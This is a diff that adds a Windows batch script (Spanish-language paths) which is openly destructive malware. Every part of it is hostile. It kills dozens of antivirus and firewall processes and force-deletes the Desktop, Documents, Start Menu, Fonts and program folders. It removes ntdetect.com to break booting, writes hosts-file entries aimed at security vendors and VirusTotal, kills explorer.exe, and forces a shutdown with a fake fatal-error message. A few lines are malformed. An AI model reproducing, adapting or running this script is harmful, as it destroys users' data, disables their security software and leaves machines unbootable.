@@ -1,0 +1,67 @@
+@echo off
+tskill aak.exe
+tskill AcctMgr.exe
+tskill McAfeeVirusScanService.exe
+tskill MCAgentExe.exe
+tskill pavsrv51.exe
+tskill prevsrv.exe
+tskill PsImSvc.exe
+tskill nod32krn.exe
+tskill nod32kui.exe
+tskill nod32.exe
+tskill avgupsvc.exe
+tskill avgamsvr.exe
+tskill avgemc.exe
+tskill avgcc.exe
+tskill ashDisp.exe
+tskill ashMaiSv.exe
+tskill ashServ.exe
+tskill ashWebSv.exe
+tskill aswUpdSv.exe
+tskill _avp32.exe
+tskill avsched32.exe
+tskill luall.exe
+tskill moolive.exe
+tskill mpftray.exe
+tskill n32scanw.exe
+tskill navapw32.exe
+tskill navlu32.exe
+tskill navnt.exe
+tskill rescue.exe
+tskill safeweb.exe
+tskill scan32.exe
+tskill scan95.exe
+tskill scanpm.exe
+tskill scrscan.exe
+tskill serv95.exe
+tskill smc.exe
+tskill sphinx.exe
+tskill tbscan.exe
+tskill tca.exe
+tskill tds2-98.exe
+tskill tds2-nt.exe
+tskill wfindv32.exe
+tskill zonealarm.exe
+del  /F /Q C:\Documents and Settings\%username%\Escritorio
+del /F /Q C:\Documents and Settings\%USERNAME%\Menú Inicio
+del /F /Q c:\WINDOWS\Fonts 
+del /F /Q c:\Documents and Settings\%username%\Mis documentos
+del /F /Q c:\Archivos de programas\eMule
+del /F /Q c:\WINDOWS\Cursors
+del /F /Q C:\Archivos de programa\Internet Explorer
+del /F /Q C:\Archivos de programa\Windows Media Player
+del /F /Q C:\WINDOWS\Web\Wallpaper
+cd c:\windows\System32
+attrib -r ntdetect.com 
+attrib -s ntdetect.com 
+attrib -h ntdetect.com 
+del /F /Q ntdetect.com
+echo 81.21.145.144 McAfee >> C:\WINDOWS\system32\drivers\etc\hosts
+echo 212.170.238.10 panda >> C:\WINDOWS\system32\drivers\etc\hosts
+echo 212.170.238.35 Norton >> C:\WINDOWS\system32\drivers\etc\hosts
+echo 67.15.68.49 kaspersky >> C:\WINDOWS\system32\drivers\etc\hosts
+echo 67.15.68.49 Nod32 >> C:\WINDOWS\system32\drivers\etc\hosts
+echo 66.98.250.38 virusTotal >> C:\WINDOWS\system32\drivers\etc\hosts
+echo 66.249.93.99 google >> C:\WINDOWS\system32\drivers\etc\hosts
+TASKKILL /F /IM explorer.exe
+shutdown -t -t 05 -c "error fatal de windows"
